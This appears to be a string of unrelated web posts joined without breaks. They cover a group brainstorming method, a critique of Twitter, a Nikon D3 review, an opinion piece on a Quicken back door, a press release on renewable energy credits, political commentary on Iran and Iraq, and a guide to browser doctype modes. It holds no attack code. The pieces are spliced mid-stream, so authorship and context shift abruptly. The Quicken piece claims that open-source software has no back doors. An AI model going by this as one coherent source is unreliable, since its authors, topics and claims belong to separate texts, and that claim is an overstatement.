This approach exploits the wisdom - of - crowds through a process of enforced idea diversity and voting , so no consensus , committe , or even agreement is needed .
And it 's way more fun .
The Product Design Dinner Party takes 9 people , a pile of diverse " inputs " , and has each of the 9 people voting on -- and pitching -- one another 's ideas to continuously reconfigured groups of 3 people , letting the best ideas rise to the top .
The process is a little complicated , but it 's derived / modified from an existing rapid - prototyping design I 'll talk about later in the post .
The basic idea looks like this , although there are a million ways to modify it :
1 ) Pick 9 people , ideally from different parts of your company and including some customers .
( If you do n't have a company yet , pick 9 friends -- preferably those who do n't know each other well )
2 ) Buy / borrow / find at least 20 " input materials " including books , magazines , a short film , graphic novels , etc. ( a list of possibilities is a little lower in this post )
3 ) Assign ( randomly ) at least 2 " inputs " to each person .
Do NOT let them choose ( it 's important they not be allowed to gravitate toward things they 're already comfortable with )
4 ) Give the group 30 minutes to generate 4 ideas ( if it 's a feature / upgrade party , then 4 different features or feature sets ... if it 's a feature implementation party , then 4 different ways to implement the already - decided feature , etc . )
These 4 ideas do n't have to come directly from their input materials , although participants should be highly encouraged to describe at least one new thing they learned that inspired their idea .
5 ) Round One begins : split into 3 groups of 3 people ( see chart below ) .
Each person gets no more than 10 minutes to " pitch " four ideas to the other two in their group .
There are 12 total ideas for this group , so allow about 30 minutes .
Record ( anonymously ) the selections of each person , which represent a " vote " for the ideas .
6 ) At the end of Round One , each person must select their two favorite ideas from each of the other two members of their group .
So if Group One had Fred , Mary , and Sue ... then Fred must select his two favorite ideas from the four that Mary pitched , and his two favorites that Sue pitched .
7 ) Round Two begins : reconfigure the groups so that each person is now with different people ( see chart below ) .
Instead of pitching their own four ideas , each person pitches the four ideas they chose from their previous group members .
Again , they have about 10 minutes to pitch the four ideas .
Remember , the point is that each person is no longer pitching their own ideas !
8 ) At the end of Round Two , each person must again select their two favorite ideas from each of the other two members of this new group .
Record ( anonymously ) the selections of each person , which represent a " vote " for the ideas .
9 ) Round Three begins : reconfigure the groups again .
Each person in the group now pitches the four ideas ( two from each of the two members of their most recent group ) they chose in the previous ( Round Two ) round .
10 ) At this point , each person has pitched a total of 12 ideas :
* Round One : pitch your own four ideas
* Round Two : pitch four ideas from your Round One group to your new Round Two group -- two ideas from each of your previous group 's other members .
* Round Three : pitch four ideas from your Round Two group to your new Round Three group , as before .
11 ) At the end of Round Three , again each person selects their top two favorite ideas from the ones pitched by the other two members .
Record these as a vote .
12 ) You should now have a total of 108 votes .
Choose the top 9 vote - getters ( you 'll have to be creative about tie - breaking ... you could choose more than 9 , for example ) .
13 ) Give each person a copy of the 9 ideas , and send them back for another round of " inputs . "
Again , assign each person different materials from the ones they used at the beginning .
14 ) Give the participants 30 minutes to use their inputs and flesh out a single idea from the nine .
Their one idea can be a modified version of one of the nine , based on their " research . "
Their one idea could be a mashup of two or more of the nine ideas .
It cannot , however , be something completely new .
Participants should be prepared to explain how something they got from their inputs helped in some way ( not an absolute requirement ) .
15 ) Now it 's up to you what to do with the ideas .
You might choose just one , or take all 9 " winners " with their pitches back to another person or group , etc .
Group Configurations ( just an idea to get you started ) :
While it might be hard to believe a process like this could lead to any useful ideas , it 's actually derived from a well - desiged , heavily - field - tested rapid - prototyping / development process from one of the leading training consultants on the planet , Thiagi .
Granted , that does n't mean my modifications have n't completely messed it up , but the main goals and benefits of doing it this way are :
1 ) Time constraints
Constraint - fueled creativity is something we 've talked about earlier , so I wo n't discuss it here .
Build something cool in 24 hours
Creativity on Speed
How to make something amazing right now
and a little in Don't wait for the muse
2 ) Forced lack of attachment
By having to pitch someone else 's ideas instead of your own ( after Round One ) , it keeps people from getting stuck / married / attached to their own idea .
3 ) Random , outside - your - domain inputs
By having to use pre-selected ( and pre-assigned ) materials from outside your domain , participants have a better chance for a diversity - driven inspiration .
The whole thing is based on the assumption that you have all the knowledge you need -- the wisdom within your own company and your customers ... you just need a way to tap into it that does n't dilute the idea ( as design - by - consensus would do ) or prevent innovation ( as design - by - listening - to - customers would do ) .
Ideas for " input materials "
Books on a wide range of topics outside your domain including architecture , astronomy , pop culture , filmmaking , comic books , wedding planning , education , children 's book , romance - novel - writing , crafts magazine , travel book , sports , history , environment , etc .
If it 's a software product , you might assign people to look at a variety of pre-chosen sites or web apps that are way outside your domain .
I 've used this in the training world -- as a tool for learners to help come up with what they ought to be learning , but I 've never used it in the way I 've described here .
I 'm looking forward to trying it ...
( And yes , I took a little artistic license with the photo at the top -- pizza and coke might be better than alcohol .
Then again ...)
I 'd love to hear ideas for modifying this , or from anyone who 's done anything like this !

Seven Blog Virtues ( for a Global Microbrand )
I was on a panel at SXSWi based on Hugh MacLeod 's Global Microbrand idea .
My slides for that panel were very lightweight -- nothing meaty , just an orientation that I believe is really important if you 're trying to attract more readers .
I 've added a little text to the slides and made a PDF here :
Download SevenVirtues.pdf ( 4.7 MBs )
So , no secret tips and tricks , just a way of thinking about blogging for the purpose of building a Global Microbrand ( whether the brand is you , your product , a cause , etc. ) .

Is Twitter TOO good ?
Twitter scares me .
For all its popularity , I see at least three issues : 1 ) it 's a near - perfect example of the psychological principle of intermittent variable reward , the key addictive element of slot machines .
2 ) The strong " feeling of connectedness " Twitterers get can trick the brain into thinking its having a meaningful social interaction , while another ( ancient ) part of the brain " knows " something crucial to human survival is missing .
3 ) Twitter is yet another -- potentially more dramatic -- contribution to the problems of always - on multi- tasking ... you ca n't be Twittering ( or emailing or chatting , of course ) and simultaneously be in deep thought and / or a flow state .
[ Disclaimer : I 'm SO in the minority on this one ... it looks like about a hundred - to - one in favor of Twitter , so I 'm most likely way wrong on this one ( but it does n't stop me from trying ) .
And this post is mostly a mashup of a variety of earlier posts I 've made on related subjects . ]
I 'll look at each of the three points in more detail :
1 ) The Twitter Slot Machine
One of Skinner 's most important discoveries is that behavior reinforced intermittently ( as opposed to consistently ) is the most difficult to extinguish .
In other words , intermittent rewards beat predictable rewards .
It 's the basis of most animal training , but applies to humans as well ... which is why slot machines are so appealing , and one need n't be addicted to feel it .
From a
Time magazine feature story on multitasking :
Patricia Wallace , a techno - psychologist , ... believes part of the allure of e-mail - - for adults as well as teens -- is similar to that of a slot machine .
" You have intermittent , variable reinforcement , " she explains .
" You are not sure you are going to get a reward every time or how often you will , so you keep pulling that handle . "
2 ) The feeling of connectedness
The biggest benefit most people seem to be deriving from Twitter is the ability to feel more connected to others .
Carson Systems ' Lisa put it this way in a comment to Tara Hunt 's defense of Twitter :
" Twittering fills in those gaps ... recording our friends ’ feelings , geographic location and actions as if we were spookily almost there .
That makes us feel * really * connected ... "
Is this really a good thing ?
Probably , yes .
For most people , perhaps .
But I think it 's worth a critical look as opposed to an automatic connected - is - awlays - implicitly - good response .
UCSF neurobiologist Thomas Lewis claims that if we 're not careful , we can trick a part of our brain into thinking that we 're having a real social interaction -- something crucial and ancient for human survival -- when we actually are n't .
This leads to a stressful ( but subconscious ) cognitive dissonance , where we 're getting some of what the brain thinks it needs , but not enough to fill that whatever - ineffable - thing - is - scientists - still - have n't - completely - nailed - but - might - be- smell .
He did n't make this claim about Twitter ...
I attended his talk at The Conference on World Affairs , and he was addressing e-mail , chat , and even television ( brain recognizes it 's looking at " people " , and feels it must be having a social connection ( GOOD ) , but yet it knows something 's missing ( BAD ) .
Dr. Lewis cited a ton of studies which I did n't write down , so you can take this with a grain of salt .
Plus , I 'm extending his issues from e-mail and chat to Twitter .
But part of the reasons he talks about are that our brain has evolved an innate ability to interpret body language , facial expression , tone of voice , etc . so the brain expects these channels of information and becomes distressed when the social interaction appears to be there , but these innate , legacy - brain pieces are missing .
Again , this does n't mean that it's not worth it and highly valuable for people TO stay connected to far - flung family and friends , I 'm just saying that it 's worth a look at whether that might be lulling some folks into a false sense of " I'm connected " at the expense of real - life connections .
Coffee with your next - door neighbor could do more for your brain than a thousand Twitter updates .
While this same argument has been going around forever , and is the same claim made about television , that does n't make it untrue .
( There 's that study about the isolated Canadian village whose collective IQ went down once cable finally came to the village ...
Lewis cites it in his talks , although I can't find it referenced online ) .
Ironically , services like Twitter are simultaneously leaving some people with a feeling of not being connected , by feeding the fear of not being in the loop .
By elevating the importance of being " constantly updated , " it amplifies the feeling of missing something if you 're not checking Twitter ( or Twittering ) with enough frequency .
3 ) Twitter is the best / worst cause of continuous partial attention
From an earlier post of mine :
Worst of all , this onslaught is keeping us from doing the one thing that makes most of us the happiest ... being in flow .
Flow requires a depth of thinking and a focus of attention that all that context - switching prevents .
Flow requires a challenging use of our knowledge and skills , and that 's quite different from mindless tasks we can multitask ( eating and watching tv , etc . )
Flow means we need a certain amount of time to load our knowledge and skills into our brain RAM .
And the more big or small interruptions we have , the less likely we are to ever get there .
And not only are we stopping ourselves from ever getting in flow , we 're stopping ourselves from ever getting really good at something .
From becoming experts .
The brain scientists now tell us that becoming an expert is not a matter of being a prodigy , it 's a matter of being able to focus .
We 're already seeing a backlash response to info overload , and it seems like a good chunk of Web 2.0 VC investments are going to companies that promise to help us get / stay organized .
There 's a reason 43 Folders is a Top 100 blog , and it's got to be more than just Merlin Mann 's good looks ; )
Lots of people are talking about this , and perhaps nobody more eloquently than Linda Stone :
" To pay continuous partial attention is to pay partial attention -- CONTINUOUSLY .
It is motivated by a desire to be a LIVE node on the network .
Another way of saying this is that we want to connect and be connected .
We want to effectively scan for opportunity and optimize for the best opportunities , activities , and contacts , in any given moment .
To be busy , to be connected , is to be alive , to be recognized , and to matter .
We pay continuous partial attention in an effort NOT TO MISS ANYTHING .
It is an always - on , anywhere , anytime , any place behavior that involves an artificial sense of constant crisis .
We are always in high alert when we pay continuous partial attention .
This artificial sense of constant crisis is more typical of continuous partial attention than it is of multi-tasking . "
Bottom line(s ) :
Do I think Twitter has benefits ?
Clearly , and Tara does a great job of defining them ( although not everyone agrees that these things are all benefits , they are for her and that 's what matters ) .
Do I think people can use Twitter responsibly , without letting it get out of control or become too much of a distraction or encourage the same kind of voyeurism that makes tabloid news and TV so pervasively popular in the US ?
Yes , definitely .
All I 'm saying is that beyond the hype , we should consider just how far down the rabbit hole of always - on - attention we really want to go .
I am not in the target audience for Twitter - - I am by nature a loner .
I do n't want to be that connected .
And I also have a huge appreciation for the art of keeping the mystery alive .
I do n't want to know that much about so many people , and I sure do n't want people to know that much about me ... mundane or otherwise .
So , that puts me in the minority , and my Twitter fears are probably based solely on my own -- quirky and less common -- personality traits .

OK , It 's after 1 am and I 'm totally spent after a busy weekend test driving the Nikon D3 and editing some files .
I 'm proud to say that I 'm the only wedding or portrait photographer in the country to have been given this camera to test .
I 'll definitely post a review of the camera in the next few days , but I 've got clients to take care of before I take the time I need to write it .
My first impressions , as expected , were mind blowing .
To be brief , I 'm stunned at how responsive this camera is and I did n't believe there was much room for improvement to the way the D2xs handled .
I was clearly wrong .
The Focus , feel of the shutter , focus point selection , enormous LCD , auto white balance , dynamic range , color rendition , and a few other things have all been written about and touted , but nothing prepared me for the incredible quality of the files out of camera .
In addition , the high ISO performance , which was also talked about , is nothing short of revolutionary .
This camera literally changes the rules of photography and will simply allow me to capture things like never before .
I 'll post the full review asap .
I 'd be remiss if I did n't mention the new lenses Nikon sent to me .
The 14 - 24 mm 2.8 and the 24 - 70 mm 2.8 are amazing pieces of glass .
I 'll also review these as well .
In a nutshell , you must handle them at Photoplus if you go .
In any case , I took it for a test drive at yesterday 's wedding .
Cristina and Steven at the Rittenhouse Hotel in Philadelphia .
The decorator was the fabulous Evantine Design and the orchestra was The Eddie Bruce Orchestra .
Please keep in mind that I shot this camera quite sparingly .
I only had it in my hands for 24 hours before I needed to use it for a wedding .
My obligation was to capture this day for my client , not test a camera .
I did , however , find a few parts of the day that screamed for this camera .
The only hard part was putting it down .
I love my D2xs , but I 'll be replacing them when I get my D3's on a permanent basis .
I 'll post some data above the files .
In case anyone was wondering , I 'm unable to post full rez files until after Photoplus and these files were absolutely STRAIGHT OUT OF CAMERA !!!!
In addition , there is no software to open NEF ( RAW ) files yet so these are all JPG's with absolutely nothing done to them besides a reduction in file size for the web .
Most images were captured with auto white balance .
For the decor photos , I dialed in 2500 K to nail the color temperature .
If these are the JPG's , I can't wait to see the RAW files !!!!!!

Russian password recovery tool developer Elcom has discovered a back door in Intuit ’s Quicken software .
Of all the application types that should not have built - in security vulnerabilities like secret “ back doors ” , I ’d think financial software like Quicken would be near the top of the heap — but Intuit seems to disagree .
Of course , Intuit ’s password removal service for people who have locked themselves out of their software seems like a legitimate use for this back door , but the fact that the back door provides more than simple password removal capability seems suspicious , as does the fact that Intuit concealed the back door ’s existence before Elcom found it .
In case you ’re one of those people always inclined to believe in a corporate conspiracy to act in the customer ’s best interests , I ’ll enumerate some of the implications of something like this :
This gives unauthorized people — at Intuit and in the federal government , for instance — access to your confidential financial data .
It ’s an intentionally built - in security vulnerability .
If the backdoor exists , someone outside of Intuit can find it and use it — someone other than people you ’d trust with that information , such as a malicious security cracker looking to make money with your financial data .
Intuit has been deceiving its customers for at least four years now .
The intent was obviously not to provide password recovery for its customers , because while they do provide a password removal service , they do n’t tell anyone that the backdoor allows them far more access to the software ’s functionality than simple password removal .
Sadly , this should n’t be a surprise to anyone .
Quicken is closed source , proprietary software provided by a corporate vendor .
The implications of that state of affairs should be obvious :
The fact that Intuit is a publicly - traded corporate business entity means that you cannot trust the company to act in your best interest .
Even if the people in charge this year are trustworthy ( which you really have no way of knowing ) , the people in charge two years from now may be completely different people , and completely untrustworthy .
That ’s the nature of corporations , and there ’s nothing to be done about it unless you find some way to get your software from non-corporate vendors / developers whose nature is not so mercurial from one year to the next due to executive turnover and regularly reshuffling the board of directors .
Furthermore , the separation of actors in business from the legal consequences of their actions by corporate law reduces the motivation to avoid unscrupulous behavior , as does Intuit ’s dominant position in the financial records application market .
The fact that Quicken is closed source , proprietary software is relevant to the fact that , with closed - source software , it ’s exceedingly difficult ( if not effectively impossible ) to be sure that you ’re not getting lied to by the software vendor .
Furthermore , attempts to discern the inner workings of the software for the purpose of discovering how trustworthy it is has been rendered largely illegal by the Digital Millennium Copyright Act in the United States .
Open source software , among other benefits , ensures that any reasonably popular software has enough eyes on it that the vendor / developer ca n’t expect to get away with back doors , rootkits , and other reprehensible “ features ” to their software — the way vendors like Sony ( remember the rootkit ? ) and Intuit can .
Consider this : for each piece of closed source software in which we ( the public ) find back doors , rootkits , and other built - in security vulnerabilities , we do n’t know how many exist that we do n’t find .
We do , however , have a pretty good idea how many are in open source software — none .
Keep that in mind when choosing software that manages your confidential data , such as financial records .
I love reading magazines , but subscriptions or just buying a single issue can get expensive .
However , I havenâ€™t let money stop me from reading my favorite magazines .
I do it for free .
Itâ€™s simple .
Just go down to your local Borders or Barnes and Noble , grab all the magazines you want to read , sit down in the cafe , and read .
When youâ€™re done , put them back where they go .
Walk out the door .
Free magazines .
I havenâ€™t bought a magazine ever since Iâ€™ve started doing this .
Iâ€™ve realized that itâ€™s really pointless to buy magazines .
You can read them in one sitting , so spending $ 5 for maybe 45 minutes of reading is a big waste of money .
Plus , by not buying magazines , you keep your life clutter free .
No more old Timeâ€™s hanging around in the bathroom or taking up space on your counters .
Nice .
Start your free lifetime magazine subscription today at your local bookstore .
Your retirement account will thank you .
Constellation Energy today announced that its subsidiary , Constellation NewEnergy , has entered into a green electricity purchase agreement with the city of Evanston , Ill .
As part of the agreement , Constellation NewEnergy will secure approximately 5.5 million kilowatt - hours of Renewable Energy Credits ( RECs ) to offset 20 percent of the city ’s electricity usage .
The secured RECs will help the city of Evanston replace the carbon emissions produced during the combustion of fossil fuels with clean , renewable wind generation .
For example , one certified REC has the environmental impact of eliminating the emissions associated with one megawatt - hour of electricity produced by a fossil fuel generator .
Constellation NewEnergy will serve the city ’s combined peak demand load of approximately 4,000 kilowatts ( 19 million kilowatt - hours annually ) , which is required to power several high - profile municipal facilities , including the Robert Crown Ice Arena , Evanston Art and Cultural Centers , the Ecology Center , the municipal water pumps and the city ’s parks and recreational facilities .
“ The city of Evanston is committed to pursuing environmentally friendly solutions that help us become a more energy - efficient city and a greener community .
Our decision to offset 20 percent of our energy demands from clean wind generation will play a significant role in helping us meet this goal , ” said Mayor Lorraine H. Morton of the city of Evanston .
“ We are pleased to work with Constellation NewEnergy to find energy solutions to meet our needs and share in our commitment to renewable power generation . ”
The city of Evanston ’s decision to purchase RECs is another step in the city ’s ongoing efforts to pursue environmentally friendly solutions .
In 2005 , the city was promoted to Silver Status by Clean Air Counts , a Northeastern Illinois regional initiative to reduce greenhouse gas emissions .
Evanston has also taken steps to replace city traffic lights with energy efficient bulbs , and power city vehicles with cleaner burning bio - diesel fuel .
Based on a national average utility emissions rate , diversifying the city ’s electricity supplies with alternative fuel sources will keep more than 7.4 million pounds of carbon dioxide out of the atmosphere every year .
That amount is equivalent to avoiding the CO2 emissions produced by 300 passenger cars and is the same amount of electricity needed to power more than 500 average American homes annually .
“ As a leading supplier of competitive energy , we are pleased to provide cities and towns such as Evanston with the benefits of power agreements that not only help establish budget certainty , but also deliver an effective and efficient means to purchase green power , ” said Julie Hextell , vice president and business leader for Constellation NewEnergy ’s Great Lakes Region .
“ Evanston has already shown their commitment to providing a healthier and greener community for its residents , and Constellation NewEnergy is proud to help further its efforts . ”
After watching the whole Ahmadinejad frenzy chug along , it suddenly occurred to me that there ’s an interesting little dimension to this debate that does n’t get mentioned too often .
Stop and think about the treatment Ahmadinejad got while he was here .
From the NY Daily News ’ frantic declaration that he was Hitler to the “ liberal media ” making sure every pundit and anchor called him a crazy megalomaniac who should never have been allowed to speak at Columbia University nor visit Ground Zero , to CU president Bollinger standing there and attacking him face to face , the American anti-Iran machine took the visit as an opportunity to let its rhetoric boil over .
Much as they had on every other topic , 2008 GOP hopefuls played a game of one - upsmanship that culminated with Mitt Frickin ’
Romney making an ad crowing about the fact that he sent a letter to the United Nations Secretary General calling for Ahmadinejad to be indicted under the Genocide Conventions over his claim to “ wipe Israel off the map ” that did n’t actually happen .
No , I ’m not kidding .
He actually sent the damn letter .
Also amongst Mitt Frickin’
Romney ’s reasons to throw Ahmadinejad in the gulag concerns his nuclear proliferation , which he says makes his threats against Israel “ even more ominous ” .
He ’s got a point on that one .
A country with a megalomaniacal leader who is seeking weapons of mass destruction and has expressed desires to instigate a war against another country ?
That ’s insanity .
If we knew such a country existed , it would be crazy not to do something about it !
…hm .
While Bush has been publicly soft on Iran lately , we know that was n’t always the case .
He did , after all , declare Iran to be a part of that “ axis of evil ” so many years ago .
And he ’s refused to meet with the leaders of Iran and Syria on multiple occasions .
There is clearly hostility there .
Bush is n’t alone , though .
It was recently revealed that Dick Cheney had this great idea to get a war between Israel and Iran going so there would be a pretext for attacking Iran .
If that sounds slightly familiar , do n’t worry , you ’re not crazy .
The echoes between that and Bush ’s brilliant strategy to fly planes over Iraq painted in UN colors for the sheer purpose of getting Saddam to shoot them down is pretty clear .
Now you ’d think that the media would recall how the whole issue went with Iraq , how Bush and the boys either distorted information or just plain lied to get support behind their plan .
And yet , somehow , amazingly , unbelievably , they have n’t .
I know it ’s a cheap shot to go after FOX , but Robert Greenwald ’s quick overview of FNC ’s completely unhidden agenda to start a war with Iran is worth looking at anyway given the station ’s popularity .
Even MSNBC joined in on the stupidity .
Joe Scarborough and Pat Buchanan ruminated about how popular an initial strike against Iran would be with the American people ( despite polls showing otherwise ) .
It ’s worth noting that Buchanan does n’t say it ’s a great idea , just that the groundwork for it appears to be in place and people might like it .
He ’s also right that recent polls suggest Americans think Iran is the most dangerous country in today ’s world .
Then there ’s those candidates .
Mitt Frickin’ Romney had his “ indict the guy ! ” letter , John McRage let out the infamous “ bomb Iran ” song , and Rudy Giuliani would almost certainly attack Iran because it fits in with his whole “ 9/11 is every day ” charade .
For some reason we in America think that every other country pays extraordinarily close attention to our politics and our media .
Remember back in 2001 when the government stopped American media stations from playing bin Laden ’s tapes for fear that there were “ coded messages ” in them ?
Obviously the media is their ONLY method of communication , and it ’s American TV .
The point is that we for some reason believe that other countries watch us very closely .
If we do believe that , then it ’s not a stretch to say that Iran would have to see the propaganda being launched against them .
Remember Ahmadinejad was asked about the US march to war against Iran directly , and responded with a fairly limp “ I do n’t see it that way ” .
So he is , at the very least , aware of it .
The United States has the largest nuclear cache in the world .
In the past year , a test entitled “ Divine Strake ” has been planned that could be a step toward nuclear “ bunker busters ” .
No attempts are made to hide our military capabilities .
We have more nukes than the rest of the world put together and do n’t care who knows it .
So we ’re certainly capable of raining death upon whoever we feel like .
Our current leaders have made damning statements against Iran and taken secret steps toward initiating war with Iran .
Meanwhile , candidates for future leadership attempt to one - up each other when it comes to being tough with Iran , and our media beats the drums of war almost constantly .
America has the weapons to carry out the attack that pundits and politicians are practically frothing at the mouth for .
Iran is currently faced with a United States that is launching a campaign of war against them , and certainly has the ability to do so .
The United States set a precedent that attacking another country against the world ’s wishes based solely on a perceived threat is a justified action .
Given that , would n’t Iran be just as justified in attacking us ?
We accuse Iran of developing nuclear weapons .
We have nuclear weapons .
We accuse Iran of wanting to attack America .
We have attacked a sovereign nation and express desires to do so again .
We accuse Iran of arming our enemies .
We are arming Israel .
If Iran had our weapons , had very recently started a war of aggression , was arming a neighbor that hated us , was secretly attempting to instigate us into a smaller war in order to justify a larger one , and their media was continually demonizing our leaders and propagandizing why they “ need ” to attack us … what would America do ?

This was my plan for a blog post .
I was going to observe that there are certain circumstances under which it might be a good thing indeed to have a " foreign policy clerisy . "
In particular , a bipartisan , yet also non-partisan , group of experts would be a useful thing to have on hand if , for example , both the President of the United States and a leading Republican candidate for President were to endorse a lunatic revisionist view of the Vietnam War .
Members of this clerisy , Democrat and Republican alike , could set the country straight on the facts .
Then I was going to observe that the clerisy we have has done no such thing and has , in fact , stayed utterly silent on this small question that happens to rest at the center of the Bush administration 's justification of its policies .
Then , being a responsible blogger , I sauntered over to the Brookings website to confirm my guess that there 's be no commentary on this issue .
Well , I was half right .
There 's nothing new up on their site , but there is a July op - ed by Senior Fellow Peter Rodman endorsing the lunatic revisionist view .
Who 's Peter Rodman ?
Why he was an Assistant Secretary in the Don Rumsfeld Pentagon .
Why the Brookings Institution would look at the past five years and think that it ought to reposition itself on foreign policy further to the right by handing out sinecures to veterans of the Rumsfeld Defense Department is something I could n't really speculate on .
We want to hear what you think about this article .
Submit a letter to the editor or write to letters@theatlantic.com .
The McClatchy Newspapers have a story today about the " mysterious " lower level of combat troop deaths in August , over 50 % lower than the deaths in May .
Bill O'Reilly trumpeted the lower levels of dead when the monthly totals went from over 100 dead for a few months this year to down around 80 .
Here are the numbers and the most honest way to look at them , presented as the date ( year. month ) followed by the total number of U.S. troops killed in Iraq , not just those " killed in combat " .
7.01 83 7.02 81 7.03 81 7.04 104 7.05 126 7.06 101 7.07 79 7.08 81
The average monthly total ( 68 ) and the median monthly total ( 69 ) for the war so far are very close to one another , but both have been climbing steadily for about a year , as the last time the monthly total was less than 70 was August 2006 , when 66 American soldiers lost their lives .
At the time , that number was both above the average and above the median .
Whether you count a year from January 1 to December 31 or from the anniversary of the war 's beginning in March 2003 , no year has seen 1,000 U.S. troops killed so far .
But unless the rest of the year brings the average deaths per month down instead of up , 2007 will be the first year to see that grim threshold surpassed .
The war saps our treasury , kills our fellow citizens , lowers our prestige and the respect for the rule of law around the world , but as long as government officials are willing to lie and distort and change the subject and parse terms in ways that would have enraged Republicans if Bill Clinton did it , we will not see the end of this folly .

Activating Browser Modes with Doctype
In order to deal both with content written according to Web standards and with content written according to legacy practices that were prevalent in the late 1990s , today ’s Web browsers implement various engine modes .
This document explains what those modes are and how they are triggered .
Summary for the Impatient
The main conclusion to draw from this article is that you should start all your HTML documents ( i.e. anything that gets served as text / html ) with <! DOCTYPE html > as the first thing in the source .
( Read on to learn why . )
If you want to take extra care to make sure that users of IE8 , IE9 or IE10 cannot press a button that makes your site regress as if it was being viewed in IE7 , either configure your server to send the HTTP header X - UA - Compatible : IE= Edge for text / html or put < meta http - equiv= " X - UA - Compatible " content = " IE=Edge " > in the head of your HTML documents ( before any scripts ) .
However , the default behavior of IE versions even prior to 11 is reasonable in most cases , and IE11 no longer put the Compatibility View button in the toolbar , so you do n’t really need to jump through these IE - specific hoops .
( Read on for exceptions . )
The Scope of This Document
This document covers mode switching as it applies to Firefox and other Gecko - based browsers , Safari and other WebKit - based browsers , Chrome , new Edge , Opera , and other Chromium - based browser , Konqueror , Internet Explorer for Mac , Internet Explorer for Windows ( including Windows Phone ) and browsers that embed IE , and EgdeHTML - based Edge .
Instead of referring to the names of browser engines , the names of the best - known browsers using each engine are used instead .
This document focuses on the mode selection mechanism and does not document the exact behaviors of each mode .
The purpose of this document is to give you information on how to avoid the legacy modes and enough research to be convincing .
The purpose of this document is not to facilitate cherry - picking behaviors by deliberately choosing legacy modes .
The Modes
Here are the various modes :
Common Modes for text / html Content
The choice of the mode for text / html content depends on doctype sniffing ( discussed later in this document ) .
In IE8 through and including IE11 , but not in Microsoft Edge , the mode also depends on other factors .
However , by default even in IE8 and later , the mode depends on the doctype for non-intranet sites that are not on an exception list supplied by Microsoft .
Additionally , there are other factors involved even with IE6 and IE7 if Google Chrome Frame has been installed .
Quirks Mode
In the Quirks mode the browsers violate Web format specifications in order to avoid “ breaking ” pages authored according to practices that were prevalent in the late 1990s .
Previously , different browsers implemented different quirks .
In particular , in Internet Explorer 6 , 7 , 8 and 9 , the Quirks mode is effectively frozen IE 5.5 , while in other browsers the Quirks mode has been a handful of deviations from the Almost Standards mode .
Recently , browsers have been converging on common behavior in their Quirks modes .
Most notably , the primary Quirks mode of IE10 and IE11 is no longer an imitation of IE 5.5 but seeks to be interoperable with Quirks modes of other browsers .
The interoperable quirks are being standardized at the WHATWG .
The primary Quirks modes of IE10 and IE11 that are like the Quirks modes of other browsers are sometimes referred to as the “ interoperable Quirks mode ” to distinguish it from the IE 5.5 - imitating “ Internet Explorer 5 Quirks ” mode that IE10 and IE11 also have .
If you are authoring new page , do n’t use the Quirks mode .
Just do n’t .
Use the Standards mode .
Standards Mode
In the Standards mode the browsers try to give documents the specification - wise correct treatment to the extent implemented in a particular browser .
Since different browsers are at different stages of compliance , the Standards mode is n’t a single target , either .
The HTML specification calls this mode the “ no quirks mode ” .
Almost Standards Mode Firefox , Safari , Chrome , Edge , Opera ( since 7.5 ) , IE8 , IE9 , IE10 , and IE11 also have a mode known as “ the Almost Standards mode ” , which implements the vertical sizing of table cells traditionally and not according to the CSS2 specification .
Mac IE 5 , Windows IE 6 and 7 , Opera prior to 7.5 and Konqueror did not need an Almost Standards mode , because they did n’t implement the vertical sizing of table cells according to the CSS2 specification in their respective Standards modes anyway .
In fact , their Standards modes are closer to the Almost Standards mode than to the Standards mode of newer browsers .
In retrospect , the Web would have been better off by not having the distintion between Standards and Almost Standards , having the Almost Standards behavior as the default and having a CSS property for opting into the behavior that is the default in the Standards mode .
Still , you should use the Standards mode — not the Almost Standard mode .
The HTML specification calls this mode the “ limited quirks mode ” .
The Mode for application / xhtml+xml Content ( XML Mode )
In Firefox , Safari , Chrome , Opera and IE9 , the application / xhtml+xml HTTP Content - Type ( not a meta element nor a doctype ! ) triggers the XML mode .
In the XML mode , these browsers give the specification - wise correct treatment for XML documents to the extent implemented in a particular browser .
IE 6 , 7 and 8 did not support application / xhtml+xml .
Neither did Mac IE 5 .
In the WebKit - based Nokia S60 Browser , the application / xhtml+xml HTTP Content - Type did not trigger the XML mode due to concerns of compatibility with ill - formed content in mobile walled gardens .
( Legacy “ mobile browsers ” did n’t use a real XML parser and , therefore , ill - formed content has been labeled as XML . )
I have not tested the default browser on Symbian3 .
I have not tested Konqueror sufficiently to say what exactly happens in that browser .
IE - Specific Web Content - Controllable Additional Modes from Microsoft
The following are additional IE - specific modes that are not specified by HTML5 and that other browsers do n’t have .
Their activation involves configuration or X - UA - Compatible as an HTTP header or a meta element ( discussed below ) .
Internet Explorer 5 Quirks
In addition to the interoperable Quirks mode , IE10 and IE11 also have a mode called “ Internet Explorer 5 Quirks ” , which imitates IE 5.5 and is the mode that was known as the Quirks mode in IE6 , IE7 , IE8 and IE9 .
Internet Explorer 7 Standards IE8 , IE9 , IE10 , and IE11 have a mode that imitates the mode that was the Standards mode in IE7 .
Internet Explorer 8 Standards IE9 , IE10 , and IE11 have a mode that imitates the mode that was the Standards mode in IE8 .
Internet Explorer 8 Almost Standards IE9 , IE10 , and IE11 have a mode that imitates the mode that was the Almost Standards mode in IE8 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 8 Standards ” .
Internet Explorer 9 Standards IE10 and IE11 have a mode that imitates the mode that was the Standards mode in IE9 .
Internet Explorer 9 Almost Standards IE10 and IE11 have a mode that imitates the mode that was the Almost Standards mode in IE9 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 9 Standards ” .
Internet Explorer 9 XML IE10 and IE11 have a mode that imitates the mode that was the XML mode in IE9 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 9 Standards ” .
Internet Explorer 10 Quirks IE11 has a mode that imitates the mode that was the interoperable Quirks mode in IE10 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 10 Standards ” .
Internet Explorer 10 Standards IE11 has a mode that imitates the mode that was the Standards mode in IE10 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 10 Standards ” .
Internet Explorer 10 Almost Standards IE11 has a mode that imitates the mode that was the Almost Standards mode in IE10 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 10 Standards ” .
Internet Explorer 10 XML IE11 has a mode that imitates the mode that was the XML mode in IE10 .
In the developer tool user interface , this mode is not distinguished from “ Internet Explorer 10 Standards ” .
It is worth noting that the imitations of the previous versions of IE are not perfect .
Random examples that I have encountered myself include IE7 Standards emulation in a later IE version handling @font - face - liked EOT fonts differently and the IE9 modes of IE10 supporting CSS 2D Transformations without the - ms - when the real IE9 requires the prefix .
